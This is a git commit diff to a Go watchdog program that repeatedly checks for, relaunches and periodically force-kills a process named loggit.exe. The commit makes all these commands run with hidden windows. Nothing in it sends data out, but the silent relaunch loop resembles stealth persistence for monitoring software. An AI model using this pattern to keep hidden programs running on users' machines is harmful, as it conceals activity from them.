e6f58da7741a84029b4ab7a620289177bc0a9a49
ryzofai <38214893+ryzofai@users.noreply.github.com>
2018-05-24 08:31:19 +0800

    Update log.streamer.go

--- go/log.streamer.go
+++ go/log.streamer.go
@@ -5,6 +5,7 @@ import (
 "os/exec"
 "time"
 "fmt"
+"syscall"
 //"strconv"
 //"strings"
 )
@@ -14,14 +15,18 @@ var ctr int
 func main() {
 	for {
 		cmnd1 := exec.Command("cmd", "/C","tasklist|findstr loggit.exe")
+		cmnd1.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		out, err := cmnd1.Output()
 		cmnd1.Start()
 		//fmt.Println(out)
 		if string(out) == "" {
 			cmnd2 := exec.Command("loggit.exe", "arg")
+			cmnd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 			cmnd2.Start()
-		} else if ctr >= 5 {
-			exec.Command("cmd", "/C", "taskkill /IM loggit.exe /F")
+		} else if ctr >= 10 {
+			cmnd3 := exec.Command("cmd", "/C", "taskkill /IM loggit.exe /F")
+			cmnd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmnd3.Start()
 			fmt.Println("taskill " + string(out) + string(ctr))
 		} else {
 			fmt.Println(ctr)
